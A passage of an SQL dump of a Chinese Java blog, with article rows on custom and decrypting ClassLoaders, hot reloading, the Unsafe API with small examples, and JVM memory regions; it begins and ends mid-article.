Class<?>[]{});\n        Object result = method.invoke(obj, new Object[]{});\n        System.out.println(result); // hello\n    }\n```\n### 实现加解密\n```java\n// 实现对Class文件的加解密加载\n为什么要加解密Class\n1. 某些代码不想让随意看见,需要进行一些加密,增加一些反编译难度\n2. 被加密的class文件无法被正常的运行和验证\n```\n#### 对文件进行加密工具类\n```java\npublic final class EncryptUtils {\n    public static final byte ENCRYPT_FACTOR = (byte) 0xff;\n\n    private EncryptUtils() {\n    }\n\n    public static void doEncrypt(String source, String target) {\n        try(FileInputStream fis = new FileInputStream(source);\n            FileOutputStream fos = new FileOutputStream(target)) {\n            int data;\n            while ((data = fis.read())!= -1) {\n                // 简单的异或加密 异或两次恢复原状 一次异或加密 第二次异或解密\n                fos.write(data ^ ENCRYPT_FACTOR);\n            }\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        doEncrypt(\"E:\\\\databak\\\\classloader1\\\\com\\\\tuwq\\\\stage1\\\\SimpleObject.class\",\n                \"E:\\\\databak\\\\classloader2\\\\com\\\\tuwq\\\\stage1\\\\SimpleObject.class\");\n    }\n}\n```\n#### 自定义解密ClassLoader\n```java\npublic class DecryptClassLoader extends ClassLoader {\n\n    public static final byte ENCRYPT_FACTOR = (byte) 0xff;\n\n    private final static String DEFAULT_DIR = \"E:\\\\databak\\\\classloader1\";\n\n    private String dir = DEFAULT_DIR;\n\n    public DecryptClassLoader() {\n        super();\n    }\n\n    public DecryptClassLoader(ClassLoader parent) {\n        super(parent);\n    }\n\n    @Override\n    protected Class<?> findClass(String name)\n            throws ClassNotFoundException {\n        String classPath = name.replace(\".\", \"/\");\n        File classFile = new File(dir, classPath + \".class\");\n\n        if (!classFile.exists()) {\n            throw new ClassNotFoundException(\"The class \" + name + \" not found under directory [\" + dir + \"]\");\n        }\n        byte[] classBytes = loadClassByte(classFile);\n        if (null == classBytes || classBytes.length == 0) {\n            throw new ClassNotFoundException(\"load the class \" + name + \" failed\");\n        }\n        return this.defineClass(name, classBytes, 0, classBytes.length);\n    }\n\n    private byte[] loadClassByte(File classFile) {\n        try(ByteArrayOutputStream baos = new ByteArrayOutputStream();\n            FileInputStream fis = new FileInputStream(classFile)\n        ) {\n            int data;\n            while ((data = fis.read())!=-1) {\n				// 再一次异或,进行解密\n                baos.write(data ^ ENCRYPT_FACTOR);\n            }\n            baos.flush();\n            return baos.toByteArray();\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    public void setDir(String dir) {\n        this.dir = dir;\n    }\n}\n```\n#### 测试\n```java\npublic class ClassLoaderTest {\n    public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException {\n        // MyClassLoader classLoader = new MyClassLoader();\n        DecryptClassLoader classLoader = new DecryptClassLoader();\n        classLoader.setDir(\"E:\\\\databak\\\\classloader2\");\n        Class<?> aClass = classLoader.loadClass(\"com.tuwq.stage1.SimpleObject\");\n        System.out.println(aClass);\n    }\n}\n```\n\n### 实现热加载\n```java\n// 什么是热加载\n1. 对于Java应用程序来说,热加载就是在运行时更新Java类文件\n2. 单纯替换Class文件是无法热加载的,因为默认类加载器只加载一次,且执行前需要GC回收\n3. 分布式场景下热加载(部署)使用配置中心实现\n4. 便于开发环境,避免频繁重启,避免浪费琐碎时间\n5. 热加载导致的频繁读写会严重消耗资源,对性能有影响\n```\n\n#### 准备两份版本class文件\n```java\npublic class User {\n    // 运行目录的class反编译为v1.0\n    public void run() {\n        System.out.println(\"v1.0\");\n    }\n}\n```\n```java\npublic class User {\n    // 运行目录的class反编译为v1.0\n    public void run() {\n        System.out.println(\"v2.0\");\n    }\n}\n```\n```java\n1. 定义一个User,分两个版本v1.0和v2.0,两份class文件,采用jd-gui反编译工具查看代码\n2. v1.0版本为当前运行目录的class文件,放在ide的target目录下\n3. v2.0版本放在预备目录F:\\dirtest中的\n```\n#### 测试,错误的方式直接替换文件\n```java\npublic class Hotswap {\n    public static void main(String[] args) throws Exception {\n        User user = new User();\n        // v1.0\n        user.run();\n        Thread.sleep(10 * 1000);\n        // 理应是v2.0,但实际打印v1.0\n        user.run();\n    }\n}\n```\n```java\n1. 运行后,在线程睡眠的15秒时间中将F:\\dirtest中的v2.0版本替换到ide的target目录目标v1.0版本的class文件(手动)\n2. 15秒后,打印结果两次依然是v1.0\n3. 虽然v2.0版本将v1.0的class文件已替换,但没有成功.原因就是因为默认类加载器只加载一次\n```\n\n#### 定义自定义的ClassLoader\n```java\n/**\n * classLoader\n * @author tuwq\n */\npublic class MyClassLoader extends ClassLoader {\n    /**\n     * 获取文件名称\n     * 读取文件流\n     * 读取byte数组给jvm\n     */\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        try {\n            String fileName = name.substring(name.lastIndexOf(\".\") + 1) + \".class\";\n            InputStream is = this.getClass().getResourceAsStream(fileName);\n            byte[] bytes = new byte[is.available()];\n            is.read(bytes);\n            return defineClass(name, bytes, 0, bytes.length);\n        } catch (IOException e) {\n            e.printStackTrace();\n            throw new ClassNotFoundException(); \n        }\n    }\n \n```\n#### 测试,成功的加载两次类\n```java\n/**\n * 热加载\n * @author tuwq\n */\npublic class Hotswap {\n\n    /**\n     * 第一次是v1.0\n     * v2.0版本将v1.0版本进行替换\n     * 第二次是v2.0\n     * @param args\n     * @throws Exception\n     */\n    public static void main(String[] args) throws Exception {\n        loadUser();\n        System.gc();\n        File file1 = new File(\"F:\\\\dirtest\\\\User.class\");\n        File file2 = new File(\"D:\\\\eclipse-workspace\\\\classloader\\\\target\\\\classes\\\\root\\\\classloader\\\\User.class\");\n        boolean isDel = file2.delete();\n        if(!isDel) { System.out.println(\"热加载失败\"); return;}\n        file1.renameTo(file2);\n        Thread.sleep(15 * 1000);\n        loadUser();\n    }\n\n    /**\n     * 类加载器读取信息\n     * @throws Exception\n     */\n    public static void loadUser() throws Exception {\n        MyClassLoader myClassLoader = new MyClassLoader();\n        Class<?> findClass = myClassLoader.findClass(\"root.classloader.User\");\n\n        Object newInstance = findClass.newInstance();\n        Method method = findClass.getMethod(\"run\");\n        method.invoke(newInstance);\n        System.out.println(newInstance.getClass());\n        System.out.println(newInstance.getClass().getClassLoader());\n    }\n}\n```\n```java\n1. 运行后,在线程睡眠的15秒时间中提醒GC进行回收,并将F:\\dirtest中的v2.0版本替换到ide的target目录目标v1.0版本的class文件(自动)\n2. 依靠自定义的类加载器进行对class文件再次加载,此时读取的就是已替换的v2.0版本\n3. 反射打印是v2.0,整个过程无需重启程序,证明热加载成功 \n4. 采用系统应用(App)加载器重新加载也可以实现\n```', 0, 0, 39, 0, 0, '2020-11-09 16:37:22', '2020-11-11 16:37:22', 0, 0);
INSERT INTO `article` VALUES (102, 1, 'Unsafe类使用', '2019/10/1570968721_mmexport1570957729880.jpg', '### 基本概念\n```java\n// Unsafe类是什么\n(1) 该类提供了普通读写,volatile读写,有序性读写,有序写入,直接内存操作,CAS相关,属性偏移量相关,线程调度,类加载,内存屏障\n(2) 但是这些方法是难以使用容易造成线程不安全的问题。\n```\n### Unsafe的API\n#### 获取Unsafe\n```java\n	// Unsafe无法直接使用,需要通过反射获取\n	private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n```\n\n#### 直接内存操作\n```java\n// Java不可以直接对内存进行操作，对象内存的分配和回收都是由JVM帮助我们实现的。\n// 但是Unsafe为我们在Java中提供了直接操作内存的能力\n// 分配内存\npublic native long allocateMemory(long var1);\n// 重新分配内存\npublic native long reallocateMemory(long var1, long var3);\n// 内存初始化\npublic native void setMemory(long var1, long var3, byte var5);\n// 内存复制\npublic native void copyMemory(Object var1, long var2, Object var4, long var5, long var7);\n// 清除内存\npublic native void freeMemory(long var1); \n```\n#### CAS相关\n```java\n// JUC中大量运用了CAS操作，可以说CAS操作是JUC的基础，因此CAS操作是非常重要的。\n// Unsafe中提供了int,long和Object的CAS操作\npublic final native boolean compareAndSwapObject(Object var1, long var2, Object var4, Object var5);\n\npublic final native boolean compareAndSwapInt(Object var1, long var2, int var4, int var5);\n\npublic final native boolean compareAndSwapLong(Object var1, long var2, long var4, long var6);\n```\n#### 属性偏移量相关\n```java\npublic native long staticFieldOffset(Field var1);\n\npublic native long objectFieldOffset(Field var1);\n\npublic native Object staticFieldBase(Field var1);\n\npublic native int arrayBaseOffset(Class<?> var1);\n\npublic native int arrayIndexScale(Class<?> var1);\n\n1. staticFieldOffset方法: 用于获取静态属性Field在对象中的偏移量，读写静态属性时必须获取其偏移量\n2. objectFieldOffset方法: 用于获取非静态属性Field在对象实例中的偏移量，读写对象的非静态属性时会用到这个偏移量\n3. staticFieldBase方法: 用于返回Field所在的对象\n4. arrayBaseOffset方法: 用于返回数组中第一个元素实际地址相对整个数组对象的地址的偏移量\n5. arrayIndexScale方法: 用于计算数组中第一个元素所占用的内存空间\n\n```\n#### 普通读写\n```java\n// 通过Unsafe可以读写一个类的属性，即使这个属性是私有的，也可以对这个属性进行读写\npublic native int getInt(Object var1, long var2);\n\npublic native void putInt(Object var1, long var2, int var4);\n\n// Unsafe还可以直接在一个地址上读写\npublic native byte getByte(long var1);\n\npublic native void putByte(long var1, byte var3);\n\n1. getInt: 用于从对象的指定偏移地址处读取一个int\n2. putInt: 用于在对象指定偏移地址处写入一个int。其他的primitive type也有对应的方法\n\n```\n#### 有序性写入\n```java\n// 有序写入只保证写入的有序性，不保证可见性，就是说一个线程的写入不保证其他线程立马可见\npublic native void putOrderedObject(Object var1, long var2, Object var4);\n\npublic native void putOrderedInt(Object var1, long var2, int var4);\n\npublic native void putOrderedLong(Object var1, long var2, long var4);\n```\n\n#### volatile读写\n```java\n// 普通的读写无法保证可见性和有序性，而volatile读写就可以保证\n可见性和有序性。\n// volatile读写相对普通读写是更加昂贵的，因为需要保证可见性和有序性，\n// 而与volatile写入相比putOrderedXX写入代价相对较低，putOrderedXX写入不保证可见性，但是保证有序性，所谓有序性，就是保证指令不会重排序\npublic native int getIntVolatile(Object var1, long var2);\n\npublic native void putIntVolatile(Object var1, long var2, int var4);\n\n1. getIntVolatile方法: 用于在对象指定偏移地址处volatile读取一个int\n2. putIntVolatile方法: 用于在对象指定偏移地址处volatile写入一个int\n\n```\n\n\n#### 线程调度\n```java\n// park方法和unpark方法相信看过LockSupport类的都不会陌生，这两个方法主要用来挂起和唤醒线程。LockSupport中的park和unpark方法正是通过Unsafe来实现的：\npublic native void unpark(Object var1);\n\npublic native void park(boolean var1, long var2);\n\npublic native void monitorEnter(Object var1);\n\npublic native void monitorExit(Object var1);\n\npublic native boolean tryMonitorEnter(Object var1);\n```\n\n```java\n// monitorEnter方法和monitorExit方法用于加锁，Java中的synchronized锁就是通过这两个指令来实现的。\n// 挂起线程\npublic static void park(Object blocker) {\n    Thread t = Thread.currentThread();\n    setBlocker(t, blocker); // 通过Unsafe的putObject方法设置阻塞阻塞当前线程的blocker\n    UNSAFE.park(false, 0L); // 通过Unsafe的park方法来阻塞当前线程，注意此方法将当前线程阻塞后，当前线程就不会继续往下走了，直到其他线程unpark此线程\n    setBlocker(t, null); // 清除blocker\n}\n\n// 唤醒线程\npublic static void unpark(Thread thread) {\n    if (thread != null)\n        UNSAFE.unpark(thread);\n}\n```\n#### 类加载\n```java\npublic native Class<?> defineClass(String var1, byte[] var2, int var3, int var4, ClassLoader var5, ProtectionDomain var6);\n\npublic native Class<?> defineAnonymousClass(Class<?> var1, byte[] var2, Object[] var3);\n\npublic native Object allocateInstance(Class<?> var1) throws InstantiationException;\n\npublic native boolean shouldBeInitialized(Class<?> var1);\n\npublic native void ensureClassInitialized(Class<?> var1);\n\n1. defineClass方法: 定义一个类，用于动态地创建类。\n2. defineAnonymousClass方法: 用于动态的创建一个匿名内部类。\n3. allocateInstance方法: 用于创建一个类的实例，但是不会调用这个实例的构造方法，如果这个类还未被初始化，则初始化这个类。\n4. shouldBeInitialized方法: 用于判断是否需要初始化一个类。\n5. ensureClassInitialized方法: 用于保证已经初始化过一个类。\n\n```\n#### 内存屏障\n```java\npublic native void loadFence();\n\npublic native void storeFence();\n\npublic native void fullFence();\n\n1. loadFence：保证在这个屏障之前的所有读操作都已经完成。\n2. storeFence：保证在这个屏障之前的所有写操作都已经完成。\n3. fullFence：保证在这个屏障之前的所有读写操作都已经完成。\n\n```\n\n\n### 使用示例\n#### 数字原子性叠加\n```java\npublic class UnsafeExample1 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        ExecutorService service = Executors.newFixedThreadPool(10);\n        Counter counter = new CasCounter();\n        long start = System.currentTimeMillis();\n        for (int i = 0; i < 1000; i++) {\n            service.submit(new CounterRunnable(counter, 10_000));\n        }\n        service.shutdown();\n        service.awaitTermination(1, TimeUnit.HOURS);\n        long end = System.currentTimeMillis();\n\n        System.out.println(\"Counter result;\" + counter.getCounter());\n        System.out.println(\"Time passed in ms:\" + (end - start));\n    }\n\n    interface Counter {\n        void increment();\n\n        long getCounter();\n    }\n\n    static class CasCounter implements Counter {\n        private volatile long counter = 0;\n        private Unsafe unsafe;\n        private long offset;\n\n        CasCounter() throws Exception {\n            // 获取unsafe\n            unsafe = getUnsafe();\n            // 获取CasCounter类的非静态属性counter偏移量\n            offset = unsafe.objectFieldOffset(CasCounter.class.getDeclaredField(\"counter\"));\n        }\n\n        @Override\n        public void increment() {\n            long current = counter;\n            // 进行CAS操作,改变值\n            while (!unsafe.compareAndSwapLong(this, offset, current, current+1)) {\n                current = counter;\n            }\n        }\n\n        @Override\n        public long getCounter() {\n            return counter;\n        }\n    }\n\n    static class CounterRunnable implements Runnable {\n        private Counter counter;\n        private int num;\n\n        CounterRunnable(Counter counter, int num) {\n            this.counter = counter;\n            this.num = num;\n        }\n\n        @Override\n        public void run() {\n            for (int i = 0; i < num; i++) {\n                counter.increment();\n            }\n        }\n    }\n}\n```\n#### allocateInstance不会执行构造器\n```java\npublic class UnsafeExample2 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void main(String[] args) throws InstantiationException {\n        Unsafe unsafe = getUnsafe();\n        // 不会进入构造函数初始化\n        Simple simple = (Simple)unsafe.allocateInstance(Simple.class);\n    }\n\n    static class Simple {\n        private long l = 0;\n        private int i = 10;\n        private byte b = (byte)0x01;\n        public Simple() {\n            this.l = 1;\n            System.out.println(\"=========\");\n        }\n        public long get() {\n            return this.l;\n        }\n    }\n}\n```\n#### 修改对象实例属性值\n```java\npublic class UnsafeExample3 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void main(String[] args) throws NoSuchFieldException {\n        Unsafe unsafe = getUnsafe();\n        // 修改对象实例属性值\n        Guard guard = new Guard();\n        Field f = guard.getClass().getDeclaredField(\"ACCESS_ALLOWED\");\n        unsafe.putInt(guard, unsafe.objectFieldOffset(f), 42);\n        guard.work();\n    }\n\n    static class Guard {\n        private int ACCESS_ALLOWED = 1;\n        public boolean allow() {\n            return 42 == ACCESS_ALLOWED;\n        }\n        public void work() {\n            if (allow()) {\n                System.out.println(\"I am working by allowed\");\n            }\n        }\n    }\n}\n```\n#### 加载类文件\n```java\npublic class UnsafeExample4 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n    public static void main(String[] args) throws Exception {\n        Unsafe unsafe = getUnsafe();\n        // 加载类文件\n        byte[] bytes = loadClassContent();\n        Class<?> aClass = unsafe.defineClass(null, bytes, 0, bytes.length, ClassLoader.getSystemClassLoader(), null);\n        int v = (int) aClass.getMethod(\"get\").invoke(aClass.newInstance(), null);\n        System.out.println(v);\n    }\n\n    private static byte[] loadClassContent() throws IOException {\n        File f = new File(\"E:\\\\databak\\\\A.class\");\n        FileInputStream fis = new FileInputStream(f);\n        byte[] content = new byte[(int)f.length()];\n        fis.read(content);\n        fis.close();\n        return content;\n    }\n}\n// 需要被加载的class文件代码\npublic class A {\n    private int i = 0;\n\n    public A() {\n        this.i = 1;\n    }\n\n    public int get() {\n        return i;\n    }\n}\n```\n#### 获取对象所占大小,像C的sizeof那样\n```java\npublic class UnsafeExample5 {\n    private static Unsafe getUnsafe() {\n        try {\n            Field f = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            f.setAccessible(true);\n            return (Unsafe)f.get(null);\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        }\n    }\n\n    public static void main(String[] args) {\n        System.out.println(sizeof(new Simple()));\n    }\n\n    private static long sizeof(Object obj) {\n        Unsafe unsafe = getUnsafe();\n        Set<Field> fields = new HashSet<>();\n        Class c = obj.getClass();\n        while (c != Object.class) {\n            Field[] declaredFields = c.getDeclaredFields();\n            for(Field f : declaredFields) {\n                // 不是静态属性,添加\n                if ((f.getModifiers() & Modifier.STATIC) == 0) {\n                    fields.add(f);\n                }\n            }\n            c = c.getSuperclass();\n        }\n        long maxOffSet = 0;\n        for (Field f: fields) {\n            long offSet = unsafe.objectFieldOffset(f);\n            if (offSet > maxOffSet) {\n                maxOffSet = offSet;\n                System.out.println(\"type:\" + f.getType());\n                System.out.println(\"max:\" + maxOffSet);\n            }\n        }\n        return (( maxOffSet / 8 ) + 1) * 8;\n    }\n\n    static class Simple {\n        private long l = 0;\n        private int i = 10;\n        private byte b = (byte)0x01;\n        public Simple() {\n            this.l = 1;\n            System.out.println(\"=========\");\n        }\n        public long get() {\n            return this.l;\n        }\n    }\n}\n```', 0, 0, 47, 0, 0, '2020-11-12 20:12:09', '2021-02-11 20:12:09', 0, 0);
INSERT INTO `article` VALUES (103, 1, 'JVM的内存区域划分', '2018/9/1536377718_3820bd5a4a04cb806198482a52df82ad.jpg', '### 内存区域划分\n#### 内存区域划分\n![JVM内存区域划分.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-内存区域划分.png)\n```java\n// 内存区域划分\nJVM会加载类到内存里来供后续运行，所以JVM里就必须有一块内存区域，用来存放我们写的那些类。\nJVM在运行写好的代码时，使用多块内存空间，不同的内存空间用来放不同的数据。\n\n// JVM主要的内存区域\n// 方法区\n(1) 方法区与java堆一样,是各个线程共享的内存区域\n(2) 它用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。它有个别命叫Non-Heap（非堆）\n(3) 方法区是线程共享的,通常用来保存装载的类的结构信息\n(4) 通常和元空间关联在一起,但具体的跟JVM实现和版本有关\n(5) JVM规范把方法区描述为堆的一个逻辑部分,但它有一个名称为Non-heap(非堆),应是为了与Java堆区分开\n// 方法区的运行时常量池\n(1) 运行时常量池是方法区的一部分。\n(2) Class文件中除了有类的版本、字段、方法、接口等描述信息外,还有一项信息是常量池,\n(3) 用于存放编译期生成的各种字面量和符号引用，这部分内容将在加载后进入方法区的运行时常量池中存放。 \n(4) 是Class文件中每个类或接口的常量池表,在运行期间的表示形式,通常包括:类的版本、字段、方法、接口等信息\n(5) 在方法区中分配\n(6) 通常在加载类和接口到JVM后,就创建相应的运行时常量池\n(7) JDK8后取消了方法区(永久代),取而代之的是元数据空间(MetaSpace)\n(8) JDK8后取而代之元数据空间并不在虚拟机里面,而是直接使用本地内存\n\n// 堆内存\n(1) java堆是java虚拟机所管理的内存中最大的一块，是被所有线程共享的一块内存区域，在虚拟机启动时创建。此内存区域的唯一目的就是存放对象实例，这一点在Java虚拟机规范中的描述是：所有的对象实例以及数组都要在堆上分配\n(2) java堆是垃圾收集器管理的主要区域，因此也被成为\"GC堆\"（Garbage Collected Heap）\n(3) 从内存回收角度来看java堆可分为：新生代和老生代\n(4) 从内存分配的角度看，线程共享的Java堆中可能划分出多个线程私有的分配缓冲区（Thread Local Allocation Buffer，TLAB）\n(5) 根据Java虚拟机规范的规定，java堆可以处于物理上不连续的内存空间中。当前主流的虚拟机都是可扩展的(通过 -Xmx 和 -Xms 控制).如果堆中没有内存完成实例分配,并且堆也无法再扩展时,将会抛出OutOfMemoryError异常。\n(6) 用来存放应用系统创建的对象和数组,所有线程共享Java堆\n(7) GC主要就管理堆空间,对分代GC来说,堆也是分代的\n(8) 堆的优点: 运行期动态分配内存大小,自动进行垃圾回收\n(9) 堆的缺点: 效率相对较慢\n\n// 程序计数器\n(1) 程序计数器是一块较小的内存空间，它可以看作是当前线程所执行的字节码的行号指示器。\n(2) 由于Java虚拟机的多线程是通过线程轮流切换并分配处理器执行时间的方式来实现的，一个处理器都只会执行一条线程中的指令。\n(3) 因此,为了线程切换后能恢复到正确的执行位置,每条线程都有一个独立的程序计数器,各个线程之间计数器互不影响,独立存储。\n(4) 程序计数器内存区域是虚拟机中唯一没有规定OutOfMemoryError情况的区域\n\n// Java虚拟机栈\n(1) 栈由一系列帧(Frame)组成(因此Java栈也叫帧栈),是线程私有的\n(2) 帧用来保存一个方法的局部变量、操作数栈(Java没有寄存器,所有参数传递使用操作数栈)、常量池指针、动态链接、方法返回值等\n(3) 每一次方法调用创建一个帧,并压栈,退出方法的时候,修改栈顶指针就可以把栈帧中的内容销毁\n(4) 局部变量表存放了编译其可知的各种基本数据类型和引用类型,每个slot插槽存放32位的数据,long、double占两个槽位\n(5) 栈的优点: 存取速度比堆快,仅次于寄存器\n(6) 栈的缺点: 存在栈中的数据大小,生存期是在编译期决定的,缺乏灵活性\n\n// 本地方法栈\n(1) 本地方法栈与虚拟机栈所发挥作用非常相似,它们之间的区别不过是虚拟机栈为虚拟机执行Java方法(也就是字节码)服务\n(2) 用来支持native方法执行的栈就是本地方法栈\n\n// 执行引擎\n(1) 虚拟机核心的组件就是执行引擎,它负责执行虚拟机的字节码,一般户先进行编译成机器码后执行\n(2) JVM字节码执行引擎,基本功能就是输入字节码文件,然后对字节码进行解析并处理,最后执行执行的结果\n(3) 实现方式可能有通过解释器直接解释执行字节码,或者是通过即使编译器产生本地代码,也就是编译执行,当然也可能两者皆有\n\n// 垃圾收集系统\n(1) 垃圾收集系统是Java的核心,也是不可少的,Java有一套自己进行垃圾清理的机制,开发人员无需手工清理\n\n// 直接内存\n(1) 直接内存不是虚拟机运行时数据区的一部分,也不是java虚拟机规范中定义的内存区域\n(2) 但这部分区域也呗频繁使用，而且也可能导致OutOfMemoryError异常\n\n// 各种数据存储位置\n// 堆与栈\n堆: 运行时的数据区,垃圾回收负责,可以动态分配内存大小,不必告诉编译器(运行时动态分配内存,存取速度相对慢) \n栈: 存取速度比堆要快,仅此于计算机中的寄存器(栈的数据是可以共享的,存在栈中的大小与生成期必须是确定的,缺少灵活性,栈中存放基本类型的变量) \n[对象存放在堆上][调用栈和本地变量存放在线程栈上]\n存放在堆上的变量可以被所持有对象引用的线程访问\n当一个线程可以访问一个对象的时候,它也可以访问这个对象的成员变量\n如果两个线程同时调用同一个对象的同一个方法,它们将都会访问这个对象的成员变量,但是每一个线程都拥有这个成员变量的私有拷贝  \n\n// 方法内的本地变量\n一个本地变量,可能是一个指向对象的引用,这种情况下引用这个本地变量存放在线程栈上,但是对象本身存放在堆上\n一个对象可能包含方法,这些方法可能包含本地变量,这些本地变量仍然存放在线程栈上(即使这些方法所属的对象存放在堆上)\n\n// 静态成员变量与非静态成员变量\n一个对象的非静态成员变量可能会随着这个对象自身存放在堆上(不管这个对象是原始类型还是引用类型) \n静态成员变量跟随类的定义一起存放在方法区上\n```\n#### 存放类的方法区\n![JVM方法区.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-方法区.png)\n```java\n// 存放类的方法区\n方法区在JDK 1.8以前的版本里代表JVM中的一块区域。\n主要是放从\".class\"文件里加载进来的类，还会有一些类似常量池的东西放在这个区域里。\n但是在JDK 8以后，这块区域的取而代之的叫做\"Metaspace\"，可以认为是\"元数据空间\"这样的意思。也是主要存放各种类相关的信息。\n// 例子\n假设有一个\"Hello.class\"类和\"User.class\"类，类似下面的代码。\npublic class Hello {\n	public static void main() {\n		User user = new User();\n	}\n}\n这两个类加载到JVM后，就会放在这个方法区中\n```\n#### 执行代码指令用的程序计数器\n![JVM程序计数器.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-程序计数器.png)\n```java\n// 执行代码指令用的程序计数器\n// 例子\npublic class Hello {\n	public static void main() {\n		User user = new User();\n		user.loadData();\n	}\n}\n上面这段代码首先会存在于\".java\"后缀的文件里，这个文件就是java源代码文件。\n但是这个java文件是面向开发人员的，计算机是看不懂写的这段代码。\n所以此时就得通过编译器，把\".java\"后缀的源代码文件编译为\".class\"后缀的字节码文件。\n这个\".class\"后缀的字节码文件里，存放的就是对写出来的代码编译好的字节码。\n\n// 程序计数器\n首先Java代码被编译成字节码指令，然后字节码指令会被一条一条执行，这样才能实现代码执行的效果。\n所以当JVM加载类信息到内存之后，实际就会使用自己的字节码执行引擎，去执行代码编译出来的代码指令。\n那么在执行字节码指令的时候，JVM里就需要一个特殊的内存区域了，那就是\"程序计数器\"。\n这个程序计数器就是用来\"记录当前执行的字节码指令的位置的\"，也就是记录目前执行到了哪一条字节码指令。\nJVM是支持多个线程的，所以其实代码可能会开启多个线程并发执行不同的代码，所以就会有多个线程来并发的执行不同的代码指令。\n因此每个线程都会有自己的一个程序计数器，专门记录当前这个线程目前执行到了哪一条字节码指令了。\n```\n#### Java虚拟机栈\n![JVM虚拟机栈.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-虚拟机栈.png)\n![JVM虚拟机栈帧.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626509401_JVM-虚拟机栈帧.png)\n```java\n// Java虚拟机栈\nJava代码在执行的时候，一定是线程来执行某个方法中的代码\n在main线程执行main()方法的代码指令的时候，就会通过main线程对应的程序计数器记录自己执行的指令位置。\npublic class Hello {\n    public static void main() {\n        User user = new User();\n        user.loadData();\n    }\n}\n在方法里，经常会定义一些方法内的局部变量\n比如在上面的main()方法里，其实就有一个\"user\"局部变量，他是引用一个User实例对象的。\n因此，JVM必须有一块区域是来保存每个方法内的 \"局部变量\" 等数据的，这个区域就是\"Java虚拟机栈\"\n每个线程都有自己的Java虚拟机栈,，比如这里的main线程就会有自己的一个Java虚拟机栈，用来存放自己执行的那些方法的局部变量。\n\n如果线程执行了一个方法，就会对这个方法调用创建对应的一个\"栈帧\"。\n栈帧里就有这个方法的局部变量表 、操作数栈、动态链接、方法出口等东西。\n比如main线程执行了main()方法，那么就会给这个main()方法创建一个栈帧，压入main线程的Java虚拟机栈。\n同时在main()方法的栈帧里，会存放对应的\"user\"局部变量。\n接着假设main线程继续执行User对象里的方法，在\"loadData\"方法里定义一个局部变量\"hasFinishLoad\"。\npublic class Hello {\n    public void loadData() {\n		Boolean hasFinishLoad = false;\n	}\n}\n那么main线程在执行上面的\"loadData\"方法时，就会为\"loadData\"方法创建一个栈帧压入线程自己的Java虚拟机栈里面去。\n这样在栈帧的局部变量表里就会有“hasFinishedLoad”这个局部变量。\n接着如果\"loadData\"方法调用了另外一个\"isLocalDataCorrupt()\"方法 ，这个方法里也有自己的局部变量。\npublic class Hello {\n    public void loadData() {\n		Boolean hasFinishLoad = false;\n		if(isLocalDataCorrupt()) {}\n	}\n	public Boolean isLocalDataCorrupt() {\n		Boolean isCorrupt = false;\n		return isCorrupt;\n	}\n}\n如果\"isLocalDataCorrupt\"方法执行完毕了，就会把\"isLocalDataCorrupt\"方法对应的栈帧从Java虚拟机栈里给出栈\n如果\"loadData\"方法也执行完毕了，就会把\"loadData\"方法也从Java虚拟机栈里出栈。\n\n上述就是JVM中的\"Java虚拟机栈\"这个组件的作用：调用执行任何方法时，都会给方法创建栈帧然后入栈\n在栈帧里存放了这个方法对应的局部变量之类的数据，包括这个方法执行的其他相关的信息，方法执行完毕之后就出栈。\n所以每个线程在执行代码时，除了程序计数器以外，还搭配了一个Java虚拟机栈内存区域来存放每个方法中的局部变量表。\n\n// 栈帧相关的一些内容\n// 栈帧\n(1) 栈帧是用于支持JVM进行方法调用和方法执行的数据结构\n(2) 栈帧随着方法调用而创建,随着方法结束而销毁\n(3) 栈帧里面存储了方法的局部变量、操作数栈、动态链接、方法返回地址等信息\n// 局部变量表\n局部变量表: 用来存放方法参数和方法内部定义的局部变量的存储空间\n(1) 局部变量表建立在线程的堆栈上面，线程私有的，无论读写两个连续的Slot是否为原子操作，都不会引起数据线程安全问题。\n(2) 以变量槽slot为单位,目前一个slot存放32位以内的数据类型,，可以保存类型为 int, short, reference, byte, char, floath和returnAddress的数据，两个本地变量可以保存类型为long和double的数据\n(3) 对于实例方法,第0位slot存放的是this,然后从1到n,依次分配给参数列表\n(4) 然后根据方法体内部定义的变量顺序和作用域来分配slot\n(5) lot是复用的,以节省栈帧的空间,这种设计可能会影响到系统的垃圾收集行为\n// 操作数栈\n用来存放方法运行期间,各个指令操作的数据\n(1) 操作数栈中元素的数据类型必须和字节码指令的顺序严格匹配\n(2) 虚拟机在实现栈帧的时候可能会做一些优化,让两个栈帧出现部分重叠区域,已存放公用的数据\n// 